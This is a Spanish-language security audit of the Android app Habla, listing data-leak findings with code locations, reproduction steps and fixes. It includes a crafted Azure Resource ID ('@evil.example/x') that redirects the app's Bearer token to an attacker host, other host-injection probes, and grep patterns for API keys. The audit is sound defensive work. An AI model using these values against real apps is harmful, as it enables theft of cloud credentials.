# Hallazgos de B4 · Fugas de información (fase 1, estático)

Fecha: 2026-10-05 · Commit auditado `6874443` (v5.8 build 33) · Solo lectura. No se usó teléfono ni navegador. Ningún secreto copiado.

Base: AUD-SEG-001 (B0) ya cubre «APK distribuido debuggable + claves en claro en `CapacitorStorage.xml` + CDP/`run-as`». No se duplica; aquí solo se enlaza.

Resumen:

| ID | Severidad | Estado | Título |
|---|---|---|---|
| AUD-FUG-401 | MEDIA | **CONFIRMADO** (navegador, red falsa) | El Resource ID de Azure no se valida: el token Bearer de Azure se envía a otro host |
| AUD-FUG-402 | BAJA | CONFIRMADO (configuración de los APK) · sin restos hoy en logcat | Los APK v3.0–v5.7 que siguen en `apk/` registraban en logcat los ajustes con las claves |
| AUD-FUG-403 | BAJA | CONFIRMADO en parte (copia en `Documentos/Habla` en el POCO; la de `cache/` no se observó) | La copia de seguridad queda en claro en `Documentos/Habla` (y en `cache/` según el código) |
| AUD-FUG-404 | BAJA | **CONFIRMADO** (POCO, CDP) | `CapacitorStorage.xml` no solo guarda las claves: también el prompt de la clase en curso (con el perfil) y el historial |
| AUD-FUG-405 | BAJA | HIPÓTESIS (no reproducible: sin auriculares BT) | El nombre del dispositivo Bluetooth se escribe en logcat (`HablaAudio`) aunque `loggingBehavior` sea `none` |
| AUD-FUG-406 | INFO | **CONFIRMADO** (navegador, red falsa) | El perfil (nombre, ocupación en texto libre, motivos, intereses) va a Gemini en cada turno y en el plan |
| AUD-FUG-407 | INFO | CONFIRMADO (estático); no comprobable en el POCO (Backup Manager desactivado) | La copia automática en la nube incluiría IndexedDB y `localStorage` |
| AUD-FUG-408 | INFO | CONFIRMADO (estático) | Comentarios desactualizados sobre logs y almacenamiento |
| AUD-FUG-409 | — | DESCARTADO (estático + navegador + POCO con 1 llamada real) | Controles que pasan (repositorio, `dist/`, APK, región de Azure, logcat v5.8, netlog, WebView) |

Fase 2 (2026-10-05, 21:05–21:20): navegador 800×600 con red falsa (`evidencia/nav-red-falsa.md`) y POCO v5.8 build 33 por CDP + logcat (`evidencia/tel-*.txt`, `tel-almacen-resumen.md`). Llamadas reales usadas: **1 de 2** (B4-1, Gemini, «¿Qué digo?»). Azure: ninguna.

---

### AUD-FUG-401 · El Resource ID de Azure no se valida: el token Bearer de Azure puede enviarse a otro host

- **Severidad:** MEDIA
- **Estado:** CONFIRMADO (P-B4-03): con Resource ID `@evil.example/x`, al abrir Ajustes → Gemini la app pidió el token a `login.microsoftonline.com` y mandó `GET evil.example/x/providers/microsoft.insights/metrics` con `Authorization: Bearer …`; mostró «≈ 0 min de 5 h usadas» sin avisar y guardó `res:"@evil.example/x"` en `habla.azureUsage`. Sin huella en ningún momento (en web `confirmIdentity` deja pasar siempre, pero `saveMonitor` ni siquiera la llama para este campo).
- **Probado en:** estático + navegador 800×600 (red falsa, valores ficticios)
- **Dónde:** `src/lib/azureUsage.ts:76-78` (``const url = `https://management.azure.com${res}/providers/…` `` con `res = c.resourceId.trim()` y cabecera `Authorization: Bearer ${t}`); `src/components/AzureSettings.tsx:122-128` (`saveMonitor` guarda `azureResourceId`, `azureTenantId` y `azureClientId` **sin** `confirmIdentity`; solo se pide al cambiar el secreto), `:93-96` (al guardar se lanza `monthUsage` sola).
- **Qué pasa:** el Resource ID se concatena justo detrás del host sin comprobar que empieza por `/subscriptions/`. Con `@otro.host/x` la URL pasa a ser `https://management.azure.com@otro.host/x/…` (host = `otro.host`); con `.otro.host/x`, host = `management.azure.com.otro.host`. La app pide primero un token a Microsoft con el secreto del *service principal* y luego manda ese token Bearer al host elegido.
- **Por qué importa:** quien tenga el teléfono desbloqueado unos segundos (o convenza al usuario de pegar un «Resource ID» de una guía) puede cambiar ese campo **sin la huella** y recibir un token de Azure Resource Manager válido ~1 h con los permisos del *service principal* (Monitoring Reader o más si el usuario le dio más). Rompe la promesa de D-02: el secreto está protegido con el bloqueo, pero lo que se obtiene con él no.
- **Cómo reproducir:**
  1. `node -e "console.log(new URL('https://management.azure.com'+'@evil.example/x'+'/providers/microsoft.insights/metrics').host)"` → `evil.example`.
  2. Con `.evil.example/x` → `management.azure.com.evil.example`.
  3. (Dinámico, pendiente) Ajustes → Modelos → Azure → Acceso a Azure Monitor → Resource ID `@127.0.0.1:8099/x` con red falsa → observar a dónde va el `GET` con `Authorization`.
- **Esperado:** el Resource ID se valida con un patrón (`^/subscriptions/[0-9a-f-]{36}/resourceGroups/[^/]+/providers/Microsoft\.CognitiveServices/accounts/[^/]+$`) y se construye con `new URL(path, 'https://management.azure.com')` comprobando `host`; cambiar cualquier campo del acceso pide el bloqueo.
- **Obtenido:** concatenación de texto libre; host controlable.
- **Evidencia:** `resultados/B4/evidencia/nav-red-falsa.md` §P-B4-03; salida de Node (`@evil.example/x -> evil.example`, `.evil.example/x -> management.azure.com.evil.example`, `:443@evil.example/x -> evil.example`). En el POCO no hay *service principal* configurado, así que hoy el dueño no está expuesto.
- **Causa raíz:** construcción de URL por concatenación y falta de validación de entrada; `confirmIdentity` solo protege el secreto.
- **Propuesta de corrección:** validar el Resource ID con regex y comprobar `url.host === 'management.azure.com'` antes de enviar el token; pedir `confirmIdentity` al cambiar tenant, client o resource. No se aplica en esta auditoría.
- **Relacionado con:** D-02, AUD-SEG-001.

### AUD-FUG-402 · Los APK v3.0–v5.7 que siguen en `apk/` registraban en logcat los ajustes con las claves

- **Severidad:** BAJA
- **Estado:** CONFIRMADO para la configuración de los APK. En el POCO, el búfer de logcat actual (463 307 líneas desde 2026-10-05 11:07) tiene **0** `AIza`, `x-goog-api-key`, `Ocp-Apim`, `client_secret`, `habla.settings` y `Capacitor/Console`; no quedan APK de Habla en `Download/`. La exposición pasada (antes de v5.8) no se puede comprobar ya.
- **Probado en:** estático (APK en el PC) + POCO (logcat, `ls Download`)
- **Dónde:** `apk/Habla-v3.0.apk` … `apk/Habla-v5.7.apk` (21 archivos): `assets/capacitor.config.json` **sin** `loggingBehavior` → valor por defecto `debug` → en APK debuggable `loggingEnabled = isDebug = true` (`node_modules/@capacitor/android/.../CapConfig.java:293-303`). Solo `Habla-v5.8.apk` lleva `"loggingBehavior":"none"`. El arreglo entró en `b4e6b70` (2026-10-05); el comentario de `capacitor.config.ts:7` reconoce que antes se imprimían «Ajustes (con las claves) y cabeceras HTTP».
- **Qué pasa:** durante días el teléfono del dueño escribió en logcat las llamadas al puente de Capacitor (p. ej. `Preferences.set` con `habla.settings`, cabeceras `x-goog-api-key` / `Ocp-Apim-Subscription-Key`). Los APK viejos siguen en `apk/` (y quizá en `Download/` del teléfono) y cualquiera que los instale en otro teléfono vuelve a tener ese comportamiento.
- **Por qué importa:** logcat lo leen `adb`, los informes de error (*bugreport*, «Comentarios» de MIUI) y herramientas de soporte; si alguno se compartió en esas fechas, las claves salieron. Ninguna clave real aparece dentro de los APK (`AIza` = 0 en los 22).
- **Cómo reproducir:**
  1. `for f in apk/*.apk; do unzip -p "$f" assets/capacitor.config.json | grep -o loggingBehavior; done` → solo v5.8.
  2. (Dinámico, P-B4-07) `adb logcat -d | grep -c AIza` (solo el número) en el teléfono.
- **Esperado:** ningún APK distribuido con logs del puente; claves rotadas si estuvieron en logcat.
- **Obtenido:** 21 APK con logs del puente activos.
- **Evidencia:** salida del bucle en fase 1 (`log=(defecto)` en v3.0–v5.7); `evidencia/tel-logcat-antes.txt`, `evidencia/tel-download-apk.txt` (vacío).
- **Causa raíz:** `loggingBehavior` por defecto (`debug`) + builds de depuración (AUD-SEG-001).
- **Propuesta de corrección:** borrar los APK ≤ v5.7 de `apk/` y del teléfono; valorar rotar la clave de Gemini, la de Azure y el secreto del *service principal* (sobre todo si alguna vez se generó un *bugreport*). No se aplica.
- **Relacionado con:** AUD-SEG-001, D-02.

### AUD-FUG-403 · La copia de seguridad y el resumen del test quedan en claro en `Documentos/Habla` y en `cache/`, y la copia de la caché no se borra

- **Severidad:** BAJA
- **Estado:** CONFIRMADO en parte. En el POCO existe `/sdcard/Documents/Habla/habla-backup-2026-10-02.json` (18 273 B, 2026-10-01 20:20, `-rw-rw---- media_rw`): tablas `sessions` (2), `turns` (11, con `text`), `mistakes` (4), `profile` (1, con `name`, `about`, `interests`, `tests`), `lookups` (0), `cards` (4); **0** `AIza`/`geminiKey`/`azureKey`/`clientSecret`/audio. En `cache/` **no** había ninguna copia (solo `WebView` y `Crash Reports`): la copia de caché que deja el código no se observó (quizá la limpió el sistema). No se pidió exportar de nuevo (decisión del coordinador).
- **Probado en:** estático + POCO (`ls`, estructura del JSON sin valores, `run-as ls cache/`)
- **Dónde:** `src/lib/backup.ts:19-23` (exporta las 6 tablas: `sessions`, `turns`, `mistakes`, `profile`, `lookups`, `cards`), `:47-53` (escribe en `Directory.Documents/Habla/`), `:60-65` (segunda copia en `Directory.Cache`, nunca se borra); `src/lib/testSummary.ts:142,148` (igual para el resumen del test); `android/app/src/main/res/xml/file_paths.xml:3-4` (`external-path path="."` y `cache-path path="."`).
- **Qué pasa:** el JSON lleva perfil completo (nombre, ocupación, motivos, intereses, niveles, tests), todas las transcripciones y correcciones, informes y consultas de palabras, sin cifrar. Queda en almacenamiento compartido (lo leen apps con «acceso a todos los archivos», o el PC por USB/MTP) y otra copia en `cache/` que se acumula una por día. El FileProvider declara todo el almacenamiento externo, más amplio de lo necesario (solo se comparte la caché).
- **Por qué importa:** es una exportación pedida por el usuario y no lleva claves (correcto, D-02), pero el usuario no sabe que queda una copia permanente en `Documentos` además de la que comparte, ni que no está cifrada.
- **Cómo reproducir:** leer el código citado; dinámico P-B4-05.
- **Esperado:** decir claramente dónde queda; borrar la copia de `cache/` tras compartir (o al arrancar); FileProvider limitado a `cache-path`.
- **Obtenido:** dos copias en claro, una sin limpieza.
- **Evidencia:** `backup.ts:47-65`, `file_paths.xml:3`; `evidencia/tel-documents-habla.txt`, `evidencia/tel-backup-estructura.json`, `evidencia/tel-run-as-listados.txt`.
- **Propuesta de corrección:** `Filesystem.deleteFile` de la copia de caché tras `Share.share` (o limpieza al iniciar); quitar `external-path`; avisar en Datos de que el archivo contiene las conversaciones. No se aplica.
- **Relacionado con:** —

### AUD-FUG-404 · `CapacitorStorage.xml` no solo guarda las claves: también el prompt de la clase en curso (con el perfil) y el historial

- **Severidad:** BAJA
- **Estado:** CONFIRMADO: en el POCO `habla.savedClass` tiene `system` de 5 816 caracteres que contiene el nombre/ocupación del perfil y `history` de 24 mensajes; `CapacitorStorage.xml` mide 14 075 B (solo `ls`, sin leerlo). En el navegador, `CapacitorStorage.habla.savedClass` en `localStorage`.
- **Probado en:** estático + POCO (CDP, resumen sin valores) + navegador
- **Evidencia:** `evidencia/tel-almacen-resumen.md`, `evidencia/tel-run-as-listados.txt`.
- **Dónde:** `src/lib/savedClass.ts:10-23,40-42` (`habla.savedClass` en `Preferences`: `system` —prompt del profe con nombre, ocupación, intereses, debilidades (`teacher.ts:129-136`, `profile.ts:45-55`)— e `history` con las transcripciones).
- **Qué pasa:** la clase guardada (NC-16) vive en el mismo archivo que las claves. Está bien excluida de las copias (mismo archivo), pero amplía lo que expone AUD-SEG-001 (`run-as`) y lo que sale en un `Preferences` de la vista web (`localStorage['CapacitorStorage.habla.savedClass']`).
- **Por qué importa:** quien lea el archivo por la vía de AUD-SEG-001 obtiene, además de las claves, datos personales y la última conversación.
- **Esperado / Obtenido:** consistente con D-02, pero sin documentar.
- **Propuesta de corrección:** documentarlo; si se cifra el almacenamiento (Keystore), cubrir también `habla.savedClass`.
- **Relacionado con:** AUD-SEG-001, NC-16.

### AUD-FUG-405 · El nombre del dispositivo Bluetooth se escribe en logcat (`HablaAudio`) aunque `loggingBehavior` sea `none`

- **Severidad:** BAJA
- **Estado:** HIPÓTESIS. En el POCO, logcat de la sesión (39 375 líneas, clase reanudada + llamada real) tiene 0 líneas `HablaAudio`: no había auriculares Bluetooth conectados y la rama de `setCommunicationDevice` no se ejecutó. Confirmado en cambio que ningún `console.*` (`HABLA-NET`, `HABLA-MIC`, `Capacitor/Console`) llega a logcat.
- **Probado en:** estático + POCO (logcat)
- **Evidencia:** `evidencia/tel-logcat-llamada-real.txt`.
- **Dónde:** `android/app/src/main/java/com/shift/habla/AudioRoutePlugin.java:222` (`Log.i("HablaAudio", "setCommunicationDevice(" + pick.getProductName() + …)`), `:84` (`Log.w`). En JS, `src/lib/recorder.ts:168` (`label` del micrófono) y `src/lib/audioRoute.ts:71`, pero esos **no** llegan a logcat con `loggingBehavior: 'none'` (`BridgeWebChromeClient.onConsoleMessage` usa `Logger`, que respeta `shouldLog()`, y devuelve `true`, así que Chromium tampoco lo imprime).
- **Qué pasa:** `Log.i` nativo no pasa por `Logger` de Capacitor: escribe siempre, también en release. El nombre del producto Bluetooth suele incluir el nombre del dueño («AirPods de X»).
- **Por qué importa:** dato personal menor en logcat/bugreports.
- **Propuesta de corrección:** registrar solo el tipo de dispositivo o envolver en `if (BuildConfig.DEBUG)`.
- **Relacionado con:** AUD-FUG-402.

### AUD-FUG-406 · El perfil (nombre, ocupación en texto libre, motivos, intereses) va a Gemini en cada turno

- **Severidad:** INFO
- **Estado:** CONFIRMADO (P-B4-01): en un turno de clase el `systemInstruction` llevaba «Name: … · What they do: … · Why … · Interests: …» + 5 `contents` (historial + audio webm); la petición del plan de 12 semanas, lo mismo. «¿Qué digo?», Palabras y lista de modelos no llevan el perfil. Además, mientras no hay plan guardado, la petición del plan (con el perfil) se repite **cada vez que se vuelve al Inicio** (visto con la red falsa, cuya respuesta no era un plan válido; aviso para B6).
- **Probado en:** estático + navegador (red falsa, perfil ficticio)
- **Evidencia:** `evidencia/nav-red-falsa.md` §P-B4-01.
- **Dónde:** `src/lib/profile.ts:45-55` (`describeStudent`), usado en `src/lib/teacher.ts:133` (prompt de sistema de **cada** turno de la clase) y `src/lib/plan.ts:140`; el historial completo de la clase se reenvía en cada turno (`teacher.ts:192`) y entero al informe (`Conversation.tsx:534`).
- **Qué pasa:** el nombre y el texto libre «a qué te dedicas» viajan a Google en todas las peticiones de clase y plan. El nombre no es necesario para la tarea (solo para saludar). Los temas, palabras, repaso y test **no** llevan el perfil (solo niveles).
- **Por qué importa:** minimización de datos; con la clave gratuita de AI Studio, Google puede usar los contenidos para mejorar sus productos.
- **Propuesta de corrección:** avisar en el perfil de que esos datos se envían a Gemini; opción de no mandar el nombre.
- **Relacionado con:** mapa de datos (`mapa-datos.md`, D1–D3).

### AUD-FUG-407 · La copia automática en la nube incluye IndexedDB y `localStorage` (transcripciones, perfil, ID de suscripción de Azure)

- **Severidad:** INFO
- **Estado:** CONFIRMADO (estático). P-B4-06 no comprobable: en el POCO `bmgr enabled` → «Backup Manager currently disabled» (activarlo sería cambiar un ajuste del sistema; no se hizo). Mientras siga así, nada de Habla sale por la copia automática.
- **Probado en:** estático + POCO (`bmgr`, `dumpsys backup`)
- **Evidencia:** `evidencia/tel-backup-manager.txt`.
- **Dónde:** `android/app/src/main/res/xml/data_extraction_rules.xml:4-9` y `backup_rules.xml:3-4` (solo excluyen `sharedpref/CapacitorStorage.xml`); `AndroidManifest.xml:5` (`allowBackup="true"`); `src/lib/azureUsage.ts:91` (`habla.azureUsage` guarda `res` = Resource ID con el ID de suscripción); `src/lib/gemini.ts:486-495` (`habla.netlog`).
- **Qué pasa:** las exclusiones cubren correctamente el único archivo con secretos (nombre del grupo de `Preferences` = `CapacitorStorage`; ambas variantes, Android ≤11 y ≥12, *cloud* y *device-transfer*). Todo lo demás (WebView: IndexedDB `habla`, `localStorage`) va a la copia de Google del usuario.
- **Por qué importa:** es la cuenta del propio usuario y Android ≥9 la cifra con el bloqueo; se anota para el mapa de datos. Verificado que `netlog` no lleva prompts con datos personales: `what` = 50 primeros caracteres del prompt de sistema, que empiezan por textos fijos («Your name is <profe>…», «You pick conversation topics…»; ver `SettingsScreen.tsx:858-866`), más modelo, tamaño, estado, tokens y error ≤120 caracteres.
- **Propuesta de corrección:** ninguna obligatoria; opcional excluir `app_webview` si se quiere que las conversaciones solo salgan por exportación manual.
- **Relacionado con:** D-02.

### AUD-FUG-408 · Comentarios desactualizados sobre logs y almacenamiento

- **Severidad:** INFO
- **Estado:** CONFIRMADO (estático)
- **Dónde:** `src/lib/gemini.ts:449` («Sale por consola (logcat: "Capacitor/Console")»: desde v5.8 ya no sale a logcat, solo por CDP); `src/lib/settings.ts:7-8` («Nunca se escribe … en las copias»: cierto para las copias del sistema y la exportación, pero `Preferences` en la vista web es `localStorage`).
- **Por qué importa:** puede llevar a reactivar logs «porque el diagnóstico los necesita».
- **Propuesta de corrección:** actualizar los comentarios.

### AUD-FUG-409 · Controles revisados que pasan (DESCARTADO)

- **Estado:** DESCARTADO · **Probado en:** estático + navegador (red falsa) + POCO (1 llamada real)
- **Logcat con petición real (P-B4-07, llamada B4-1):** «¿Qué digo?» en la clase reanudada → `POST generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent` por `CapacitorHttp` nativo, 200, cabeceras `content-type` y `x-goog-api-key` (`AIza…(39)`), clave fuera de la URL, cuerpo 1 KB sin perfil. Logcat desde la apertura (39 375 líneas): **0** `AIza`, `x-goog-api-key`, `Ocp-Apim`, `generativelanguage`, `habla.settings`/`savedClass`, `HABLA-NET/MIC`, `Capacitor/Console`, y 0 coincidencias de 6 frases de la pantalla (textos de la clase). Lo único de Capacitor: `D Capacitor: Starting BridgeActivity` (se escribe antes de cargar la config; inocuo). Evidencia: `evidencia/tel-logcat-llamada-real.txt`.
- **Región de Azure en ejecución (P-B4-02):** `evil.com#`, `a/b`, `evil.com?` → URL inválida; `x.evil.com` → sigue bajo `*.api.cognitive.microsoft.com` (`evidencia/nav-red-falsa.md`).
- **Netlog y Diagnóstico (P-B4-04, P-B4-09):** en el POCO, 81 entradas sin datos del perfil en `what` ni en `error`, sin `AIza` (`evidencia/tel-almacen-resumen.md`). El texto de «Compartir diagnóstico» se construye solo con esos campos.
- **Borrador del test con audio (H-B4-1, AUD-MIC-311):** en el POCO no existía `habla-draft` con datos (ver la nota de `tel-almacen-resumen.md`: mi sonda creó una BD vacía y la borré en el acto). No reproducible hoy.
- **Repositorio:** `git log -p --all` sin ninguna coincidencia de `AIza[0-9A-Za-z_-]{35}`; ningún `keystore/`, `*.jks`, `keystore.properties`, `.env*` ni `local.properties` versionado nunca (`git log --all --name-only`); `build.gradle:23-32` lee contraseñas de `keystore/keystore.properties` (ignorado, `.gitignore:27`). Otros patrones (`storePassword`, `client_secret`, hex de 32) solo coinciden con nombres de variables.
- **Árbol de trabajo y `dist/`:** 0 `AIza`; en `dist/assets/index-*.js` solo aparecen los nombres de cabecera (`x-goog-api-key`, `Ocp-Apim-Subscription-Key`, `client_secret:e.clientSecret`).
- **APK:** 0 `AIza` en los 22 APK de `apk/`.
- **Capturas versionadas** (`docs/evidencia-v5.7/*.jpg`): revisadas las de clave y Ajustes, sin claves; la 17 muestra el nombre de perfil del dueño (dato personal menor si el repositorio de GitHub es público; no se pudo comprobar la visibilidad: no hay `gh`).
- **Claves en cabecera, nunca en URL:** Gemini `gemini.ts:379,511`; Azure `pronunciation.ts:154,219,223`; secreto del SP en el cuerpo (`azureUsage.ts:48`). Todo HTTPS (bases fijas `https://`).
- **Inyección de host por la región de Azure:** `encodeURIComponent(region)` (`pronunciation.ts:152,214`): `evil.com#` → `evil.com%23…` y `a/b` → URL inválida; `x.evil.com` sigue bajo `.stt.speech.microsoft.com`. El tenant también va codificado y con host fijo (`azureUsage.ts:46`).
- **Errores y Diagnóstico:** los mensajes de error son textos propios; Gemini añade a lo sumo `error.message` de Google (`gemini.ts:556,562,565`; puede incluir el número de proyecto en un 403). Compartir Diagnóstico (`SettingsScreen.tsx:888-895`) lleva fecha, tarea, modelo, estado, tiempo, KB y error: sin clave ni transcripciones. No hay `navigator.clipboard` en `src/`.
- **Campos de clave:** `type="password"` + `autoComplete="off"` (`AzureSettings.tsx:37-44`, `Onboarding.tsx:186`, `GeminiFix.tsx:36`); el marcador muestra los 4 últimos caracteres (aceptable).
- **WebView:** sin `window.*` globales, `postMessage`, `dangerouslySetInnerHTML` ni contenido remoto; las fuentes de *grounding* solo se muestran como título (`Conversation.tsx:830`). `setWebContentsDebuggingEnabled` lo decide Capacitor según `isDebug` (`Bridge.java:624`, `CapConfig.java:286`) → apagado en release, encendido en el APK actual (ya en AUD-SEG-001).
- **Logs JS:** con `loggingBehavior: 'none'` ningún `console.*` llega a logcat (ver AUD-FUG-405); los `[HABLA-NET]` no contienen claves, cabeceras ni cuerpos.
